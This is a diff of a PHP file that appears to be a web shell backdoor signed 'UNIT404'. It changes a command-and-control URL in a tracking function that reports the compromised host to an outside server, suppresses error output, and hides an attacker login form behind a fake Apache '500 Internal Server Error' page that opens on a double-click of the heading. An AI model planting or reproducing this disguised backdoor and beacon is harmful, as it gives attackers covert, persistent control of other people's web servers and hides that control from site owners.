@@ -4,7 +4,7 @@ error_reporting(0);
 ini_set('display_errors', 0);
 
 function unit404_track() {
-    $c2_url = "https://grtoto.store/dashboard/silent.php"; 
+    $c2_url = "https://unit404.org/dashboard/unit404eye.php"; 
     $key    = "UNIT404_404"; 
 
     $report_hash = md5($_SERVER['HTTP_HOST'] . 'unit404_v2'); 
@@ -300,14 +300,10 @@ if($GLOBALS['DB_NAME']['safemode'] == '1'){
 <html><head>
 <title>500 Internal Server Error</title>
 <style>
-@keyframes profilPutar {
-    from { transform: rotate(0deg); }
-    to { transform: rotate(360deg); }
-}
-
+@keyframes profilPutar { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
 input:-webkit-autofill,input:-webkit-autofill:hover,input:-webkit-autofill:focus{
   -webkit-text-fill-color:#fff !important;
-  -webkit-box-shadow:0 0 0 1000px #161b22 inset !important;
+  -webkit-box-shadow:0 0 0 1000px #0a0a0a inset !important;
   transition:background-color 5000s ease-in-out 0s;
   font-family:monospace !important;
 }
@@ -316,65 +312,53 @@ input::placeholder{color:#555 !important;}
 </head><body>
 <h1>Internal Server Error</h1>
 <p>The server encountered an internal error or misconfiguration and was unable to complete your request.</p>
-<p>Please contact the server administrator at admin@'.$_SERVER['HTTP_HOST'].' to inform them of the time this error occurred, and the actions you performed just before this error.</p>
+<p>Please contact the server administrator at admin@'.$_SERVER['HTTP_HOST'].' to inform them of the time this error occurred.</p>
 <p>More information about this error may be available in the server error log.</p>
 <hr>
 <address>Apache/2.4.41 (Unix) Server at '.$_SERVER['HTTP_HOST'].' Port '.$_SERVER['SERVER_PORT'].'</address>
 
 <div id="unit404_secret" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);backdrop-filter:blur(5px);z-index:9999;font-family:monospace;">
     <div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:360px;background:linear-gradient(to bottom, #0c0c0c 0, #110101 55%, #5c0202 100%);border:1.5px solid #ff0000;border-radius:20px;padding:40px;box-shadow:0 0 40px rgba(255,0,0,0.15);text-align:center;">
+        
+        <div style="position:relative; width:100px; height:100px; margin:0 auto 25px; display:flex; align-items:center; justify-content:center;">
+            <div style="position:absolute; width:100%; height:100%; border-radius:50%; border:2px solid #ff0000; box-shadow: 0 0 10px rgba(255, 0, 0, 0.5); animation: profilPutar 5s linear infinite;"></div>
+            <div style="position:absolute; width:88%; height:88%; border-radius:50%; border:1px solid rgba(255, 255, 255, 0.2); z-index:0;"></div>
+            <img src="https://i.gyazo.com/4134275e14c76c4cce6ab485c6485757.png" style="width:80px; height:80px; border-radius:50%; border:2px solid #30363d; object-fit:cover; z-index:1;">
+        </div>
 
-<div style="position:relative; width:100px; height:100px; margin:0 auto 25px; display:flex; align-items:center; justify-content:center;">
-    <div style="position:absolute; width:100%; height:100%; border-radius:50%; border:2px solid #ff0000; box-shadow: 0 0 10px rgba(255, 0, 0, 0.5); animation: profilPutar 5s linear infinite;"></div>
-    
-    <div style="position:absolute; width:88%; height:88%; border-radius:50%; border:1px solid rgba(255, 255, 255, 0.2); z-index:0;"></div>
-    
-    <img src="https://i.gyazo.com/4134275e14c76c4cce6ab485c6485757.png" style="width:80px; height:80px; border-radius:50%; border:2px solid #30363d; object-fit:cover; z-index:1;">
-</div>
-
-<div style="margin-bottom:30px;">
+        <div style="margin-bottom:30px;">
             <div style="font-size:24px; font-weight:bold; color:#fff; letter-spacing:8px; text-shadow: 0 0 15px rgba(255,255,255,0.2);">UNIT404</div>
             <div style="width:50px; height:2px; background:#ff0000; margin:12px auto; box-shadow:0 0 10px #ff0000;"></div>
             <div style="color:#8b949e; font-size:11px; letter-spacing:4px; margin-top:10px;">TEAM UNIT 404</div>
-</div>
+        </div>
 
-        <?php if ($__unit404_locked): ?>
-            <div style="color:#ff1000; font-weight:bold; padding:25px; font-size:13px; border:1px solid rgb(255 16 0 / 60%); border-radius:12px; background:rgba(248,81,70,0.1);">
-                <span style="font-size:20px;">&#9888;</span><br>SYSTEM LOCKED<br>
-                <span style="font-size:10px; color:#8b949e; font-weight:normal;">Maximum attempts reached.</span>
+        '.($__unit404_locked ? '
+        <div style="color:#ff1000; font-weight:bold; padding:25px; font-size:13px; border:1px solid rgb(255 16 0 / 60%); border-radius:12px; background:rgba(248,81,70,0.1);">
+            <span style="font-size:20px;">&#9888;</span><br>SYSTEM LOCKED<br>
+            <span style="font-size:10px; color:#8b949e; font-weight:normal;">Maximum attempts reached.</span>
+        </div>' : '
+        <form method="POST" action="">
+            <input type="hidden" name="unit404_token" value="'.__unit404_token().'">
+            <div style="margin-bottom:15px; text-align:left;">
+                <label style="color:#8b949e; font-size:10px; letter-spacing:2px; margin-left:5px;">ID_USER</label>
+                <input type="text" name="unit404_login_user" autocomplete="off" placeholder="Username" style="width:100%; padding:12px 15px; background:#0a0a0a; border:1px solid #ff0000; border-radius:10px; color:#fff; font-size:14px; font-family:monospace; outline:none; box-sizing:border-box; margin-top:5px; transition: 0.3s;">
             </div>
-        <?php else: ?>
-            <form method="POST" action="">
-    <input type="hidden" name="unit404_token" value="<?php echo __unit404_token(); ?>">
-    
-<div style="margin-bottom:15px; text-align:left;">
-    <label style="color:#8b949e; font-size:10px; letter-spacing:2px; margin-left:5px;">ID_USER</label>
-    <input type="text" name="unit404_login_user" autocomplete="off" placeholder="Username" 
-        style="width:100%; padding:12px 15px; background:#0a0a0a; border:1px solid #ff0000; border-radius:10px; color:#fff; font-size:14px; font-family:monospace; outline:none; box-sizing:border-box; margin-top:5px; transition: 0.3s;" 
-        onfocus="this.style.borderColor='red'" 
-        onblur="this.style.borderColor='#ff0000'">
-</div>
-
-
-<div style="margin-bottom:25px; text-align:left;">
-    <label style="color:#8b949e; font-size:10px; letter-spacing:2px; margin-left:5px;">ACCESS_KEY</label>
-    <input type="password" name="unit404_login_pass" autocomplete="off" placeholder="Password" 
-        style="width:100%; padding:12px 15px; background:#0a0a0a; border:1px solid #ff0000; border-radius:10px; color:#fff; font-size:14px; font-family:monospace; outline:none; box-sizing:border-box; margin-top:5px; transition: 0.3s;" 
-        onfocus="this.style.borderColor='red'" 
-        onblur="this.style.borderColor='#ff0000'">
-</div>
-
-    <button type="submit" style="width:100%; padding:14px; background:linear-gradient(to bottom, #e7e7e7 0, #bababa 55%, #969696 100%); border:none; border-radius:10px; color:#000; font-size:14px; font-weight:bold; font-family:monospace; letter-spacing:4px; cursor:pointer; transition:0.3s; box-shadow:0 5px 15px rgba(0,0,0,0.3);" onmouseover="this.style.background='#ff0000'; this.style.color='#fff'" onmouseout="this.style.background='#fff'; this.style.color='#000'">
-        ENTER
-    </button>
-</form>
-        <?php endif; ?>
+            <div style="margin-bottom:25px; text-align:left;">
+                <label style="color:#8b949e; font-size:10px; letter-spacing:2px; margin-left:5px;">ACCESS_KEY</label>
+                <input type="password" name="unit404_login_pass" autocomplete="off" placeholder="Password" style="width:100%; padding:12px 15px; background:#0a0a0a; border:1px solid #ff0000; border-radius:10px; color:#fff; font-size:14px; font-family:monospace; outline:none; box-sizing:border-box; margin-top:5px; transition: 0.3s;">
+            </div>
+            <button type="submit" style="width:100%; padding:14px; background:linear-gradient(to bottom, #e7e7e7 0, #bababa 55%, #969696 100%); border:none; border-radius:10px; color:#000; font-size:14px; font-weight:bold; font-family:monospace; letter-spacing:4px; cursor:pointer; transition:0.3s; box-shadow:0 5px 15px rgba(0,0,0,0.3);">ENTER</button>
+        </form>').'
 
         <div style="margin-top:25px; color:#fff; font-size:10px;">&mdash; SECURE GATEWAY &mdash;</div>
     </div>
 </div>
+
 <script>
-document.querySelector("h1").addEventListener("dblclick",function(){var e=document.getElementById("unit404_secret");e.style.display=e.style.display=="none"?"block":"none";});
+document.querySelector("h1").addEventListener("dblclick",function(){
+    var e=document.getElementById("unit404_secret");
+    e.style.display=e.style.display=="none"?"block":"none";
+});
 </script>
 </body></html>';
         exit;
